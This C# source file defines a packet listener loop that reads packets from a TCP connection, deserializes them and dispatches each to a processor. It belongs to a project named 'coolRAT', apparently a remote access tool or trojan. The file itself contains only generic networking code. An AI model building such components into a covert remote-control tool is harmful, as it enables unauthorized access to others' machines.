using coolRAT.Libs.PacketProcessors;
using coolRAT.Libs.Packets;
using System;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;

namespace coolRAT.Libs
{
    public class PacketListenerLoop
    {
        public TcpConnection Connection;
        public PacketProcessor Processor;
        public bool AbortLoop;

        public PacketListenerLoop(TcpConnection connection, PacketProcessor processor, bool abortLoop)
        {
            Connection = connection;
            Processor = processor;
            AbortLoop = abortLoop;
        }

        public void Run()
        {
            while(!AbortLoop)
            {
                string packet_raw = Connection.ReadPacket();
                Packet packet = Packet.Deserialize(packet_raw);
                Task.Run(() => Processor.ProcessPacket(packet));
            }
        }
    }
}
